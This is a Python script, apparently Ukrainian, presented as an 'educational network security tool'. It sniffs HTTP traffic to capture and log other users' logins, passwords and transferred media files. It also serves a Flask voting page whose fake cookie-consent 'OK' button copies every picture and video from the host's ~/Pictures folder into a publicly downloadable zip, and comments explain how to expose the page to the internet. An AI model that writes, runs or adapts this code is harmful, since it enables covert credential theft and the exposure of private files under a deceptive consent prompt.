import os
import threading
import time
import re
import zipfile
from datetime import datetime
from scapy.all import sniff, ARP, TCP, Raw, IP
from flask import Flask, render_template_string, request, redirect, make_response, send_file

OUTPUT_DIR = "security_logs"
FILES_DIR = os.path.join(OUTPUT_DIR, "captured_files")
MATERIALS_DIR = os.path.join(os.getcwd(), "матеріли")
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(FILES_DIR, exist_ok=True)
os.makedirs(MATERIALS_DIR, exist_ok=True)

FILE_EXTS = ["jpg", "jpeg", "png", "gif", "bmp", "mp4", "avi", "mov", "mkv", "webm"]
FILENAME_RE = re.compile(
    r'Content-Disposition:.*filename=[\"\' ]?([^\"\'\s]+\.(' + "|".join(FILE_EXTS) + r'))',
    re.IGNORECASE
)
USERNAME_RE = re.compile(r'username=([^&\s]*)')
PASSWORD_RE = re.compile(r'password=([^&\s]*)')

last_arp_alert = ""
last_http_alert = ""
last_cred_alert = ""
log_lock = threading.Lock()

def arp_monitor():
    def arp_callback(packet):
        if packet.haslayer(ARP) and packet[ARP].op == 2:
            msg = f"{packet[ARP].psrc} claims to be {packet[ARP].hwsrc}"
            print(f"[!] ARP-відповідь: {packet[ARP].psrc} -> {packet[ARP].pdst}")
            try:
                with log_lock:
                    with open(f"{OUTPUT_DIR}/arp_log.txt", "a", encoding="utf-8") as f:
                        f.write(f"{datetime.now()}: {msg}\n")
            except Exception as e:
                print(f"[!] Помилка запису ARP-логу: {e}")
    print("[*] Запуск ARP-монітора...")
    sniff(filter="arp", prn=arp_callback, store=0)

def save_file(filename, data):
    path = os.path.join(FILES_DIR, filename)
    try:
        with log_lock:
            with open(path, "wb") as f:
                f.write(data)
        print(f"[+] Файл збережено: {path}")
    except Exception as e:
        print(f"[!] Помилка збереження файлу: {e}")

def extract_and_save_file(filename, data):
    extracted_dir = os.path.join(FILES_DIR, "extracted")
    os.makedirs(extracted_dir, exist_ok=True)
    save_file(filename, data)
    if filename.lower().endswith(".zip"):
        try:
            zip_path = os.path.join(FILES_DIR, filename)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extracted_dir)
            print(f"[+] Zip-архів розпаковано у: {extracted_dir}")
        except Exception as e:
            print(f"[!] Помилка при розпакуванні zip: {e}")
    elif filename.lower().endswith(".rar"):
        print("[!] Для розпакування rar потрібен модуль rarfile та встановлений unrar.")

def extract_files_from_http(payload):
    try:
        decoded = payload.decode(errors='ignore')
    except Exception:
        return
    for match in FILENAME_RE.findall(decoded):
        filename = match[0]
        file_data = payload.split(b"\r\n\r\n")[-1]
        extract_and_save_file(filename, file_data)

def parse_http_payload(payload):
    try:
        username_match = USERNAME_RE.search(payload)
        password_match = PASSWORD_RE.search(payload)
        if username_match or password_match:
            print("\n[!] Можливі дані для входу:")
            if username_match:
                print(f"   Логін: {username_match.group(1)}")
            if password_match:
                print(f"   Пароль: {password_match.group(1)}")
            print("-" * 50)
            with log_lock:
                with open(f"{OUTPUT_DIR}/http_credentials.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()}: {payload}\n")
    except Exception as e:
        print(f"[!] Помилка при парсингу HTTP payload: {e}")

def http_sniffer():
    def http_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                payload = packet[Raw].load
                try:
                    decoded_payload = payload.decode('utf-8', errors='ignore')
                except Exception:
                    return
                if ("GET /" in decoded_payload or "POST /" in decoded_payload) and packet.haslayer(IP):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    print(f"\n[HTTP] {src_ip} -> {dst_ip}")
                    print("-" * 30)
                    headers = decoded_payload.split('\r\n\r\n')[0]
                    print(headers)
                    parse_http_payload(decoded_payload)
                    try:
                        with log_lock:
                            with open(f"{OUTPUT_DIR}/http_log.txt", "a", encoding="utf-8") as f:
                                f.write(f"{datetime.now()}: {decoded_payload[:200]}...\n")
                    except Exception as e:
                        print(f"[!] Помилка запису HTTP-логу: {e}")
                if b"HTTP/1." in payload:
                    extract_files_from_http(payload)
            except Exception as e:
                print(f"[!] Помилка при обробці HTTP-пакету: {e}")
    print("[*] Запуск HTTP-сниффера (логіни/паролі + файли)...")
    sniff(filter="tcp port 80 or tcp port 8080", prn=http_callback, store=0)

def tail(filename, n=20):
    try:
        with open(filename, "rb") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            block = 1024
            data = b""
            while size > 0 and data.count(b"\n") < n:
                read_size = min(block, size)
                f.seek(size - read_size)
                data = f.read(read_size) + data
                size -= read_size
            return data.decode(errors="ignore").splitlines()[-n:]
    except Exception:
        return []

def detect_suspicious_activity():
    global last_arp_alert, last_http_alert, last_cred_alert
    arp_log = f"{OUTPUT_DIR}/arp_log.txt"
    if os.path.exists(arp_log):
        lines = tail(arp_log, 10)
        for line in lines:
            if "claims to be" in line and line != last_arp_alert:
                print("[!] Виявлено можливий ARP-спуфінгу!")
                last_arp_alert = line
                break
    http_log = f"{OUTPUT_DIR}/http_log.txt"
    if os.path.exists(http_log):
        lines = tail(http_log, 10)
        for line in lines:
            if "password=" in line and line != last_http_alert:
                print("[!] Виявлено передачу паролів через HTTP!")
                last_http_alert = line
                break
    cred_log = f"{OUTPUT_DIR}/http_credentials.txt"
    if os.path.exists(cred_log):
        lines = tail(cred_log, 5)
        for line in lines:
            if line.strip() and line != last_cred_alert:
                print("[!] Виявлено можливі логіни/паролі у HTTP-трафіку!")
                last_cred_alert = line
                break

# ==================== ВЕБ-ІНТЕРФЕЙС (FLASK) ====================
app = Flask(__name__)
VOTES = {"yes": 0, "no": 0}

TEMPLATE = """
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>Голосування</title>
    <style>
        body {
            background: #181a1b;
            color: #e0e0e0;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            min-height: 100vh;
        }
        #cookie-modal {
            position: fixed; left: 0; top: 0; width: 100vw; height: 100vh;
            background: rgba(20,22,24,0.85); z-index: 10000;
            backdrop-filter: blur(2px);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #cookie-box {
            background: #23272a;
            padding: 32px 24px 24px 24px;
            border-radius: 14px;
            width: 340px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0,0,0,0.45);
            border: 1px solid #2c2f33;
        }
        #cookie-box p {
            color: #e0e0e0;
            margin-bottom: 18px;
            font-size: 1.08em;
        }
        #main-content {
            max-width: 420px;
            margin: 48px auto 0 auto;
            background: #23272a;
            border-radius: 14px;
            box-shadow: 0 4px 24px 0 rgba(0,0,0,0.25);
            padding: 32px 32px 24px 32px;
            border: 1px solid #2c2f33;
        }
        h1, h2 {
            color: #f3f3f3;
            margin-top: 0;
        }
        p {
            color: #bdbdbd;
        }
        button {
            margin: 7px 8px;
            padding: 10px 28px;
            border-radius: 8px;
            border: none;
            background: linear-gradient(90deg, #23272a 0%, #36393f 100%);
            color: #f3f3f3;
            font-size: 1em;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 8px 0 rgba(0,0,0,0.18);
            transition: background 0.2s, color 0.2s, transform 0.1s;
        }
        button:hover, button:focus {
            background: linear-gradient(90deg, #36393f 0%, #23272a 100%);
            color: #00bfae;
            transform: translateY(-2px) scale(1.04);
            outline: none;
        }
        body.modal-active {
            overflow: hidden;
        }
        @media (max-width: 600px) {
            #main-content, #cookie-box {
                width: 95vw;
                padding: 16px 4vw 16px 4vw;
            }
        }
    </style>
</head>
<body>
<div id="cookie-modal">
    <div id="cookie-box">
        <p>Сайт використовує файли cookie</p>
        <form id="cookie-form" method="post" action="/cookie">
            <button name="action" value="ok" type="submit" id="ok-btn">OK</button>
            <button name="action" value="exit" type="button" id="exit-btn">Вийти</button>
        </form>
    </div>
</div>
<div id="main-content" style="filter: blur(2px); pointer-events: none; user-select: none;">
    <h1>Голосування: Чи подобається вам цей сайт?</h1>
    {% if cookie_accepted %}
    <form method="post" action="/vote" id="vote-form">
        <button name="vote" value="yes" type="submit" id="vote-yes">Так</button>
        <button name="vote" value="no" type="submit" id="vote-no">Ні</button>
    </form>
    <h2>Результати:</h2>
    <p>Так: {{ votes['yes'] }}</p>
    <p>Ні: {{ votes['no'] }}</p>
    <p><a href="/download_materials" style="color:#00bfae;">Скачати всі матеріали</a></p>
    <p>Поділіться цим посиланням з іншими: <b><span id="share-link"></span></b></p>
    {% else %}
    <p>Щоб проголосувати, спочатку прийміть cookie та надайте дозвіл.</p>
    {% endif %}
</div>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        document.body.classList.add("modal-active");
        var cookieModal = document.getElementById("cookie-modal");
        var mainContent = document.getElementById("main-content");
        document.getElementById("ok-btn").onclick = function(e) {
            // Дозволяємо стандартну відправку форми (submit)
        };
        document.getElementById("exit-btn").onclick = function(e) {
            e.preventDefault();
            let formData = new FormData();
            formData.append("action", "exit");
            fetch("/cookie", {
                method: "POST",
                body: formData
            }).then(resp => resp.text())
              .then(html => {
                  document.open();
                  document.write(html);
                  document.close();
              });
        };
        // Додаємо посилання для поширення
        var share = document.getElementById("share-link");
        if (share) {
            share.innerText = window.location.origin + "/";
        }
    });
</script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    cookie_accepted = request.cookies.get("cookie_accepted") == "1"
    return render_template_string(TEMPLATE, votes=VOTES, cookie_accepted=cookie_accepted)

@app.route("/cookie", methods=["POST"])
def cookie():
    action = request.form.get("action")
    if action == "ok":
        user_pictures = os.path.expanduser("~/Pictures")
        if not os.path.exists(user_pictures):
            user_pictures = os.path.expanduser("~/Зображення")
        found_files = []
        if os.path.exists(user_pictures):
            exts = ("*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.mp4", "*.avi", "*.mov", "*.mkv", "*.webm")
            for ext in exts:
                found_files.extend(
                    [f for f in glob.glob(os.path.join(user_pictures, "**", ext), recursive=True)]
                )
            for f in found_files:
                try:
                    basename = os.path.basename(f)
                    dest = os.path.join(MATERIALS_DIR, basename)
                    if not os.path.exists(dest):
                        with open(f, "rb") as src, open(dest, "wb") as dst:
                            dst.write(src.read())
                except Exception:
                    pass
        resp = make_response(redirect("/"))
        resp.set_cookie("cookie_accepted", "1")
        return resp
    else:
        return "<h2>Ви відмовились від використання cookie. Доступ заборонено.</h2>"

@app.route("/download_materials")
def download_materials():
    if request.cookies.get("cookie_accepted") != "1":
        return redirect("/")
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as zf:
        for fname in os.listdir(MATERIALS_DIR):
            fpath = os.path.join(MATERIALS_DIR, fname)
            if os.path.isfile(fpath):
                zf.write(fpath, arcname=fname)
    memory_file.seek(0)
    return send_file(memory_file, download_name="materials.zip", as_attachment=True)

@app.route("/vote", methods=["POST"])
def vote():
    if request.cookies.get("cookie_accepted") != "1":
        return redirect("/")
    v = request.form.get("vote")
    if v in VOTES:
        VOTES[v] += 1
    return redirect("/")

def run_flask():
    # Додаємо підтримку зовнішнього доступу (через будь-яку мережу)
    # Для цього потрібно:
    # 1. Запускати Flask на host="0.0.0.0"
    # 2. Вказати порт (наприклад, 5000)
    # 3. Відкрити порт 5000 у брандмауері/роутері (port forwarding)
    # 4. Використовувати вашу зовнішню (публічну) IP-адресу для доступу ззовні
    import socket
    import requests
    try:
        # Отримати локальну IP-адресу
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "127.0.0.1"
    try:
        # Отримати зовнішню (публічну) IP-адресу
        public_ip = requests.get("https://api.ipify.org").text
    except Exception:
        public_ip = "<ваша_зовнішня_IP_адреса>"

    print(f"[+] Веб-інтерфейс доступний у вашій локальній мережі: http://{local_ip}:5000/")
    print(f"[+] Для доступу з будь-якої мережі (через Інтернет): http://{public_ip}:5000/")
    print("[*] Для зовнішнього доступу відкрийте порт 5000 у вашому роутері (port forwarding)!")
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def main():
    print("=== НАВЧАЛЬНИЙ ІНСТРУМЕНТ МЕРЕЖЕВОЇ БЕЗПЕКИ ===")
    print("Цей скрипт демонструє:\n1. Детекцію ARP-спуфінгу\n2. Аналіз HTTP-трафіку (логіни/паролі, файли)\n3. Пошук підозрілих дій\n4. Веб-інтерфейс для голосування та завантаження матеріалів")
    threading.Thread(target=arp_monitor, daemon=True).start()
    threading.Thread(target=http_sniffer, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()
    print("[*] Для перегляду веб-інтерфейсу відкрийте у браузері: http://127.0.0.1:5000/")
    try:
        while True:
            detect_suspicious_activity()
            time.sleep(30)
    except KeyboardInterrupt:
        print("\n[+] Скрипт зупинено. Логи збережено у папці", OUTPUT_DIR)

if __name__ == "__main__":
    import glob
    import io
    # Якщо при git push отримуєте:
    #   error: src refspec main does not match any
    # Це означає, що гілка main ще не створена локально.
    # Створіть коміт і гілку main:
    #   git add .
    #   git commit -m "first commit"
    #   git branch -M main
    #   git push -u origin main
    # Якщо ви вже у гілці main, але немає комітів, зробіть перший коміт перед push.
    main()
